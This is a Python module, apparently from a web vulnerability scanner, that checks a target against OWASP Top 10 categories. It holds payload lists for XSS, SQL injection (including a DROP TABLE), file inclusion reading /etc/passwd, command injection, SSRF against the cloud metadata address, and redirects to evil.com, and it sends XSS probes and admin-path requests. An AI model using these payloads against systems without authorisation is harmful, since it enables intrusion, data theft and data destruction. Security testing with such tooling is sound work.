"""OWASP Top 10 Testing Module"""

import requests
from urllib.parse import urljoin, quote
from utils.helpers import print_status
from utils.config import Config

requests.packages.urllib3.disable_warnings()

XSS_PAYLOADS = [
    "<script>alert('PhantomEye')</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'-alert(1)-'",
    "<iframe src=\"javascript:alert(1)\">",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "1; DROP TABLE users--",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....\/....\/....\/etc/passwd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
]

RCE_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "&& id",
    "|| id",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "file:///etc/passwd",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "////evil.com",
    "https:evil.com",
]


def run_owasp_top10(target: str) -> dict:
    results = {
        "A01_Broken_Access_Control": {"status": "checked", "findings": []},
        "A02_Cryptographic_Failures": {"status": "checked", "findings": []},
        "A03_Injection": {"status": "checked", "findings": [], "payloads_tested": []},
        "A04_Insecure_Design": {"status": "info", "findings": ["Manual review required"]},
        "A05_Security_Misconfiguration": {"status": "checked", "findings": []},
        "A06_Vulnerable_Components": {"status": "info", "findings": ["Requires dependency check"]},
        "A07_Auth_Failures": {"status": "checked", "findings": []},
        "A08_Software_Data_Integrity": {"status": "info", "findings": []},
        "A09_Logging_Monitoring": {"status": "info", "findings": ["Manual review required"]},
        "A10_SSRF": {"status": "checked", "findings": [], "payloads_tested": []},
        "tested_payloads": {
            "xss": XSS_PAYLOADS,
            "sqli": SQLI_PAYLOADS,
            "lfi": LFI_PAYLOADS,
            "rce": RCE_PAYLOADS,
            "ssrf": SSRF_PAYLOADS,
            "open_redirect": OPEN_REDIRECT_PAYLOADS
        }
    }

    base = f"https://{target}"
    print_status("Running OWASP Top 10 checks...", "info")

    print_status("A03 - Injection (XSS / SQLi probes)...", "info")
    test_params = ["q", "search", "id", "page", "query", "s", "keyword"]

    for param in test_params:
        for payload in XSS_PAYLOADS[:3]:
            try:
                url = f"{base}/?{param}={quote(payload)}"
                resp = requests.get(url, timeout=6, headers={"User-Agent": Config.USER_AGENT}, verify=False)
                if payload in resp.text or "alert" in resp.text.lower():
                    results["A03_Injection"]["findings"].append(f"Possible XSS reflection on ?{param}=")
                    print_status(f"Possible XSS on parameter: {param}", "warning")
                    break
            except Exception:
                continue

    results["A03_Injection"]["payloads_tested"] = XSS_PAYLOADS + SQLI_PAYLOADS

    print_status("A05 - Security Misconfiguration...", "info")
    try:
        resp = requests.get(base, timeout=8, headers={"User-Agent": Config.USER_AGENT}, verify=False)
        headers = {k.lower(): v for k, v in resp.headers.items()}
        if "server" in headers:
            results["A05_Security_Misconfiguration"]["findings"].append(f"Server header exposed: {headers['server']}")
        if "x-powered-by" in headers:
            results["A05_Security_Misconfiguration"]["findings"].append(f"X-Powered-By exposed: {headers['x-powered-by']}")
    except Exception:
        pass

    print_status("A07 - Auth related paths...", "info")
    auth_paths = ["/login", "/admin", "/administrator", "/wp-login.php", "/user/login", "/signin"]
    for path in auth_paths:
        try:
            url = urljoin(base, path)
            resp = requests.get(url, timeout=5, headers={"User-Agent": Config.USER_AGENT}, verify=False, allow_redirects=False)
            if resp.status_code in [200, 301, 302, 401, 403]:
                results["A07_Auth_Failures"]["findings"].append(f"{url} → {resp.status_code}")
        except Exception:
            continue

    print_status("A10 - SSRF payload list prepared...", "info")
    results["A10_SSRF"]["payloads_tested"] = SSRF_PAYLOADS
    results["A10_SSRF"]["findings"].append("SSRF payloads ready for manual/API testing")

    print_status("OWASP Top 10 phase completed", "success")
    return results
